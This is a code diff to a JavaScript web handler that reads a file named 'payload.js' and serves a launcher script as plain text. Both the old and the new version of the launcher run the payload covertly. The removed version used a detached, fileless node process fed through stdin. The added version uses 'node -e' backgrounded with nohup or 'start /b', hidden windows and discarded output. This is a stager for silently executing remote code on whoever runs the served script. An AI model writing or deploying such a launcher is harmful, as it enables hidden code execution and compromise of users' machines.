@@ -28,37 +28,26 @@ export default function handler(req, res) {
   const scriptPath = path.resolve("./payload.js");
   const payload = fs.readFileSync(scriptPath, "utf-8");
 
-  // Launcher that spawns a detached node reading payload from stdin (no files)
+  // Prepare payload for -e "code"
+  const escaped = JSON.stringify(payload); // safe string literal
+
   const launcher = `
-/**
- * Launcher (no files):
- * - spawns a detached ` + "`node -`" + ` (read from stdin)
- * - writes the payload into child's stdin and closes it
- * - child keeps running; launcher exits immediately
- */
-const cp = require('child_process');
+const { exec } = require("child_process");
+const os = require("os");
 
-const payload = ${JSON.stringify(payload)};
+const isWin = os.platform() === "win32";
+const nodeCmd = \`node -e \${${escaped}} \`;
 
-try {
-  // spawn node that reads JS from stdin ('-' tells node to run stdin)
-  // stdio: ['pipe', 'ignore', 'ignore'] -> we will write to stdin, ignore child's stdio
-  const child = cp.spawn(process.execPath, ['-'], {
-    detached: true,
-    stdio: ['pipe', 'ignore', 'ignore']
-  });
+// Background command per OS
+const cmd = isWin
+  ? 'start "" /b ' + nodeCmd
+  : 'nohup ' + nodeCmd + ' >/dev/null 2>&1 &';
 
-  // Write payload to child's stdin, then close it.
-  child.stdin.write(payload);
-  child.stdin.end();
+// Run background
+exec(cmd, { windowsHide: true });
 
-  // Detach so parent can exit while child continues
-  child.unref();
-
-  process.exit(0);
-} catch (err) {
-  process.exit(1);
-}
+// Exit immediately
+process.exit(0);
 `;
 
   res.setHeader("Content-Type", "text/plain; charset=utf-8");
